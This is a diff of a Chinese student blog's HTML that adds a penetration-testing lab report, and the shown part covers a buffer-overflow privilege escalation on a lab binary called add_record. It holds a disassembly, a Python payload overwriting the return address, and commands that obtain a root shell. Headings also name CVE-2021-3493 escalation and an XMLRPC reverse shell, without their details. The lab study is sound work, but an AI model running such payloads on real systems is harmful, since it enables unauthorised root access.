&lt;+23&gt;:    call   0x8048530 &lt;setuid@plt&gt;</span><br><span class="line">   0x08048692 &lt;+28&gt;:    add    esp,0x10</span><br><span class="line">   0x08048695 &lt;+31&gt;:    sub    esp,0xc</span><br><span class="line">   0x08048698 &lt;+34&gt;:    lea    eax,[ebx-0x13f8]</span><br><span class="line">   0x0804869e &lt;+40&gt;:    push   eax</span><br><span class="line">   0x0804869f &lt;+41&gt;:    call   0x80484f0 &lt;system@plt&gt;</span><br><span class="line">   0x080486a4 &lt;+46&gt;:    add    esp,0x10</span><br><span class="line">   0x080486a7 &lt;+49&gt;:    nop</span><br><span class="line">   0x080486a8 &lt;+50&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x080486ab &lt;+53&gt;:    leave  </span><br><span class="line">   0x080486ac &lt;+54&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>其中调用了 <code>setuid</code> 和 <code>system</code> 函数，且根据上下文代码，发现调用 <code>setuid</code> 时传入的参数为0。该函数在主函数中没有被调用，考虑使用缓冲区溢出攻击的方式使还段函数被执行。</p>
+</li>
+<li><p>构造注入字符串：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import struct; print(&#x27;1\n1\n1\n1\n&#x27; + &#x27;a&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; <span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进行 gdb 调试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb -q add_record</span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">b *vuln			<span class="comment"># 便于观察程序行为</span></span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">r &lt; <span class="built_in">test</span>			<span class="comment"># 重定向输入文件</span></span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030234129679.png width=800 />
+</div>
+
+<p>调试过程发现传入函数 <code>system</code> 的参数为“&#x2F;bin&#x2F;bash”，显然生成了一个 root 身份的 shell。</p>
+</li>
+<li><p>退出 gdb，直接运行该程序：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span> - | ./add_record</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030235502298.png width=800 />
+</div>
+
+<p>成功获取提权。</p>
+</li>
+</ol>
+</div><div class="story post-story"><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><blockquote>
+<p>点击跳转至上文相应位置</p>
+</blockquote>
+<p><strong>任务一：</strong><a href="#task1">利用漏洞 <code>CVE-2021-3493</code> 提权</a>；</p>
+<p><strong>任务二：</strong><a href="#task2">编写 XMLRPC 客户端，进行注入，实现反弹 shell</a>；</p>
+<p><strong>任务三：</strong><a href="#task3">找到 add_record 程序的漏洞，提升权限为 root</a>。</p>
+<p style="page-break-after: always"></p>
+
+
+</div><div class="story post-story"><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p><strong>Fork1</strong></p>
+<p>- </p>
+<p><strong>Fork2</strong></p>
+<p>- </p>
+<p><strong>问题：</strong></p>
+<p>尝试不适用</p>
+</div><div class="story post-story"><h2 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h2><p>1. </p>
+<p>【感谢评阅】</p>
+
+</div>
+  </div>
   
   
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/javaNotes-3/">
-        <img itemprop="image" class='headimg' alt="集合类与I/O操作" src='/media/javaNotes-3/headimg.png'/>
-      </a>
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
     </div>
   
   
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/javaNotes-3/"  itemprop="url">
-        集合类与I/O操作
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-31T10:07:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年10月31日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        数组的长度是固定的，集合的长度是可变的。
-I. Collection接口
-collection 接口时层次结构中的根接口，构成其的单位称为元素。
-
-常用方法：
-
-
-
-方法
-功能描述
-
-
-
-add(E e)
-将指定的对象添加到该集合中
-
-
-remove(Object o)
-将指定的对象从该集合中移除
-
-
-isEmpty()
-返回boolean值，用于判断当前集合是否为空
-
-
-iterator(...
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.kekwy.com/lab6-report/&title= - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.kekwy.com/lab6-report/&title= - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.kekwy.com/lab6-report/&title= - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-08-05T08:15:26+08:00">2022-08-05</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/">从继承开始的Java应用笔记</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">从继承开始的Java应用笔记</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/javaNotes-3/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/javaNotes-2/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="铃的杂货铺">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="铃的杂货铺">
-    <meta itemprop="description" content="喜欢夏天的无名之辈">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/javaNotes-2/">
-        <img itemprop="image" class='headimg' alt="类的高级特性与异常处理" src='/media/javaNotes-2/headimg.png'/>
-      </a>
     </div>
-  
-  
+    <!-- Custom Files bottomMeta begin -->
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/javaNotes-2/"  itemprop="url">
-        类的高级特性与异常处理
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        I. Java类包
-类名冲突：
-任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。
-
-类的路径：
-
-同一个类包中的类相互访问时，可以不指定包名；
-同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。
-
-
-指定包与导入包：
-将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。
-1p...
-      
-    
+    <!-- Custom Files bottomMeta end -->
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-08-01T19:50:13+08:00">2022-08-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/">从继承开始的Java应用笔记</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">从继承开始的Java应用笔记</span></a>
-            </span>
-          
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/javaNotes-2/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+      
+        <a class='next' href='/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/'>
+          <p class='title'>渗透测试学习笔记lab1【y0usef】<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+第一周
+可弟WZ
+主页：blog.kekwy.com
+邮箱：&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#113;&#113;...</p>
+        </a>
       
     </div>
   
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
+  <!-- Custom Files postEnd begin-->
   
-    
+  <!-- Custom Files postEnd end-->
+</article>
+
+
   
 
 
-	
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/lab6-report/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
+    
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2895,131 +3231,6 @@ iterator(...
     
     
       
-<section class="widget blogger desktop pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box circle' href='/about/'>
-          <img no-lazy src='/media/images/avatar.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>可弟WZ</h2>
-        
-        
-          <p>二阶铃图</p>
-
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="mailto:keekkewy@qq.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget text desktop pjax">
-  
-  <header>
-    
-      <a href='/about/'><i class="fa fa-book fa-fw" aria-hidden="true"></i><span class='name'>与我相关</span></a>
-    
-  </header>
-
-
-  <div class='content'>
-    
-      <p>喜欢夏天的社畜程序猿。</p>
-
-    
-      <img src="/media/images/photo.jpg" class="lazyload" data-srcset="/media/images/photo.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="125px">
-    
-      <p>南京大学 计算机系 本科在读</p>
-
-    
-      <p>B站: <a target="_blank" rel="noopener" href="https://space.bilibili.com/35981385">可弟WZ柒号机</a></p>
-
-    
-      <p>知乎: <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/ke-di-ling-dong">可弟岭冬</a></p>
-
-    
-      <p>GitHub: <a target="_blank" rel="noopener" href="https://github.com/Kekwy/">Kekwy</a></p>
-
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget desktop pjax">
-  
-  <header>
-    
-      <i class="fa-solid fa-award fa-fw" aria-hidden="true"></i><span class='name'>站点信息</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <div class="webinfo">
-      
-        <div class="webinfo-item">
-          <div>文章数目：</div>
-          <div>5 篇</div>
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>已运行时间：</div>
-          <div id="webinfo-runtime-count"></div>
-        </div>
-      
-
-
-      
-
-      
-
-      
-
-      
-        <div class="webinfo-item">
-          <div>最后活动时间：</div>
-          <div id="last-update-show">2022-10-31 日</div>
-        </div>
-      
-    </div>
-  </div>
-</section>
-
     
   
 
@@ -3058,13 +3269,63 @@ iterator(...
     
   
 
+  
+    
+    
+      
+
+<section class="widget desktop mobile pjax">
+  
+  <header>
+    
+      <i class="fa-solid fa-clock WISTERIA fa-fw" aria-hidden="true"></i><span class='name'>最近更新</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <ul class="list entry navigation"><li><a class="widget-last" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><div class="item"><time>2022-09-27</time><span>渗透测试学习笔记</span></div><span>渗透测试学习笔记lab1【y0usef】</span></a></li><li><a class="widget-last" href="/javaNotes-3/"><div class="item"><time>2022-08-06</time><span>从继承开始的Java应用笔记</span></div><span>集合类与I/O操作</span></a></li><li><a class="widget-last" href="/javaNotes-2/"><div class="item"><time>2022-08-04</time><span>从继承开始的Java应用笔记</span></div><span>类的高级特性与异常处理</span></a></li><li><a class="widget-last" href="/javaNotes-1/"><div class="item"><time>2022-08-01</time><span>从继承开始的Java应用笔记</span></div><span>接口、继承与多态</span></a></li></ul>
+  </div>
+</section>
+
+    
+  
+
 
 <div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-text">一、实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-text">二、实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">0x00. 准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fork1-%E7%BA%BF%E8%B7%AF%E4%B8%80"><span class="toc-text">Fork1 线路一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x01. 文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-text">0x02. 系统漏洞本地提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fork2-%E8%B7%AF%E7%BA%BF%E4%BA%8C"><span class="toc-text">Fork2 路线二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x01. sql 注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E8%9A%81%E5%89%91%E6%8E%A5%E5%85%A5%E9%9D%B6%E6%9C%BA"><span class="toc-text">0x02. 蚁剑接入靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-XMLRPC-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-text">0x03. XMLRPC 反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="toc-text">0x04. 缓冲区溢出攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">三、实验结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">五、参考资料</span></a></li></ol>
+    </div>
+  </section>
+
+  
 
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -3096,6 +3357,7 @@ iterator(...
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
@@ -3111,14 +3373,14 @@ iterator(...
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -4150,7 +4412,7 @@ volantis.pjax.push(()=>{_hmt.push(['_trackPageview', document.location.pathname]
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/archives/2022/","name":"2022年"}},{"@type":"ListItem","position":4,"item":{"@id":"http://blog.kekwy.com/archives/2022/8/","name":"8月"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/lab6-report/"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/lab6-report/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/lab6-report/","wordCount":0,"datePublished":"2022-10-31T02:08:49.171Z","dateModified":"2022-10-31T02:07:00.322Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
